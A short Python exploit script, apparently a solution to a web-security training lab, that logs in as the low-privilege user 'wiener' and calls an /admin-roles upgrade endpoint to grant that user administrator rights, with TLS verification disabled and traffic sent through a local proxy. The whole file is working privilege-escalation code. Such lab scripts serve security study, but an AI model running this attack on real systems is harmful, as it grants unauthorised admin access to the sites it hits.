import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_scookie(url):
    login_access = "/login"
    params = {'username' : 'wiener' , 'password' : 'peter'}
    r = requests.get(url + login_access, data=params, allow_redirects=False, verify=False, proxies=proxies)
    cookie = r.cookies.get_dict()['session']
    return cookie

def promote_user(s, url):
    # LOGIN AS USER WIENER
    login_access_url = url + "/login"
    params = {'username' : 'wiener' , 'password' : 'peter'}
    r = s.post(login_access_url, data=params, verify=False, proxies=proxies)

    # PROMOTE USER TO ADMIN
    promote_user_url = url + "/admin-roles?username=wiener&action=upgrade"
    r = s.get(promote_user_url, verify=False, proxies=proxies)
    if "Admin panel" in r.text:
        return True
    else:
        return False



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session() # TRACKS SESSION (COOKIES AS WELL)

    url = sys.argv[1].strip()
    #user_session_cookie = get_scookie(url)
    if not promote_user(s, url):
        print("[-] Exploit failed! Exiting script...")
        sys.exit(-1)
    print("[+] Exploit succeded!")






if __name__ == "__main__":
    main()